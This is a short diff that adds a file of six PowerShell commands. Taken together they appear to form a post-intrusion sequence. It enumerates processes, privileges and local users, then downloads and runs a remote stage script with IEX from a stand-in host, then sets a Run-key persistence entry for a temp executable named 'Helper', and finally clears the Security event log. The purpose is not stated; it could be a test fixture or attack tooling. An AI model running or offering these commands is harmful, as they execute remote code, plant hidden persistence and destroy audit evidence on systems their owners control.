@@ -1,0 +1,6 @@
+Get-Process
+whoami /priv
+Get-LocalUser
+IEX (New-Object Net.WebClient).DownloadString('http://updates.example.test/stage.ps1')
+New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name Helper -Value 'C:\Users\jdoe\AppData\Local\Temp\update.exe'
+Clear-EventLog -LogName Security
